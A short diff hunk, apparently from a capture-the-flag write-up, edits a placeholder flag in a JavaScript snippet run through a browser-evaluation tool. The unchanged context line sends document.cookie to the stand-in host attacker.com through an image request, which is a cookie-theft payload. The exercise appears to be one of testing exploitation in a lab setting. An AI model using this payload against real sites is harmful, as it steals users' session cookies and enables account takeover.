@@ -138,7 +138,7 @@ confirm exfiltration to a placeholder collector you control:
 ```javascript
 // browser_evaluate — simulate the victim holding the flag, then verify exfil
 // Real challenge cookie is HttpOnly; this only models the non-HttpOnly case.
-document.cookie = "flag=flag{test}; path=/";
+document.cookie = "flag=flag{...}; path=/";
 new Image().src = "https://attacker.com/c?" + document.cookie;
 ```
 
